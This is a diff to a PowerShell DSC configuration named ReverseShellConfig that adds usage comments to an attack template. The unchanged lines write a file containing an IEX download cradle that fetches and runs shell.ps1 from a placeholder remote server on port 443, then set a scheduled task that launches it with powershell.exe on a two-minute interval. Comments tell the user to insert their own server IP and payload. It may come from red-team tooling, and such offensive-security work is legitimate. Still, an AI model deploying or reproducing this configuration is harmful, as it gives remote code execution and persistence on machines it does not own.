@@ -19,8 +19,10 @@ Configuration ReverseShellConfig
 	    # Replace the parameters with your own
 
 	    File DownloadPayload{
+	     # Change the default path to what you prefer
 	      DestinationPath = "C:\shell.ps1"
 	      Ensure = "Present"
+	      # Replace the contents with your remote server IP and payload name!
 	      Contents = "IEX(New-Object Net.WebClient).downloadString('http://X.X.X.X:443/shell.ps1')"
 	    }
 	    
@@ -32,6 +34,7 @@ Configuration ReverseShellConfig
 
           TaskName           = "RunPayload"
           ActionExecutable   = "C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe"
+	  # This defines where the script is located, so it must match what is in line 23!
           ActionArguments    = "-File `"C:\shell.ps1`""
           ScheduleType       = 'Once'
           RepeatInterval     = '00:02:00'
